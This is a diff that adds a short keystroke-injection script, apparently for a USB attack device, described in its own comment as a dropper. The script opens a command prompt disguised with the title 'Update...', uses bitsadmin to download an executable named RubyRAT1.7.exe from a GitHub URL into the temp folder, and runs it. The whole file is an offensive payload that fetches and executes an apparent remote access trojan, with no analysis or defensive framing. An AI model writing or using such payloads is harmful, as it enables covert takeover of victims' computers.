@@ -1,0 +1,22 @@
+REM Arthur: 
+REM Description: Will act like a dropper but for a EXE file. Will execute filelessly but drop a file...
+DELAY 1000
+GUI r
+DELAY 1500
+STRING cmd
+ENTER
+STRING @echo off
+ENTER
+STRING title Update...
+ENTER
+STRING color f
+ENTER
+STRING set pOut="%temp%\\Output.exe"
+ENTER
+STRING bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://github.com/WilleLX1/F0_BK/blob/main/CustomRawHosters/RubyRAT1.7.exe" %pOut%
+ENTER
+STRING start "" %pOut%
+ENTER
+DELAY 500
+ENTER
+REM DONE!
